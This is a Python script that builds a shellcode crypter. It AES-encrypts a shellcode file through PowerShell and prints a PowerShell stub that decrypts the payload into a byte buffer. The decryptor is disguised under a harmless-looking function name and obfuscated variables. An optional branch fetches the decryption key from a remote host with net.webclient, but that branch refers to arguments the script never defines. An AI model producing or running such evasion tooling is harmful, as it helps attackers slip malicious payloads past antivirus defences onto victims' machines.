import subprocess
import sys
import argparse

separatekey = False #initialize var for optional functionality

def pwshrun(cmd):
	completed = subprocess.run(["pwsh", "-command", cmd], capture_output=True)
	return completed

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypt shellcode from a file using AES encryption.")
    parser.add_argument("shellcode_file", help="Path to the shellcode file")
    args = parser.parse_args()

    with open(args.shellcode_file, "r") as file:
        shellcode = file.read().strip()

print("Generating AES-256 key...")
powershellkeygen = "$aesKey = New-Object byte[] 32;$rng = [Security.Cryptography.RNGCryptoServiceProvider]::Create();$rng.GetBytes($aesKey);$aesKey" #pwshgenerate random aes-256 key
aeskey = ("(" + str(pwshrun(powershellkeygen).stdout).replace("b","").replace("'","").replace("\\n",",") + ")").replace(",)",")") #generate aes-256 key and format

if separatekey:
    keyfile = args.key
    with open(keyfile, 'w') as f: #write key to file
        f.write(aeskey)
    print("AES-256 key written to: " + keyfile)
    key = "$key = (new-object net.webclient).downloadstring('http://" + args.keyhost + "/" + keyfile + "');$key = $key.split(\",\") -replace '[()]',''"
else:
    key = "$key = " + aeskey

print("\nEncrypting shellcode...")
rawshellcode = str(shellcode).replace("b'[Byte[]] $buf = ","").replace("\\n","").replace("\\r","").replace("'","") #format shellcode
powershellencrypt = "$aesKey = " + aeskey + ";$shellcode = \"" + rawshellcode + "\";$Secure = ConvertTo-SecureString -String $shellcode -AsPlainText -Force;$encrypted = ConvertFrom-SecureString -SecureString $Secure -Key $aesKey;$encrypted"
encryptedshellcode = str(pwshrun(powershellencrypt).stdout).replace("b'","").replace("\\n'","")

print("\nGenerating encrypter...")
encrypter = """function getStrawberries($a) {
    $obfu =  \"""" + encryptedshellcode + """\"
    $secureObject = ConvertTo-SecureString -String $obfu -Key $a
    $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
    $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
    $decrypted = $decrypted.split(",")
    return $decrypted
}

""" + key + """

[Byte[]] $buf = getStrawberries $key
"""
print("\n" + encrypter)
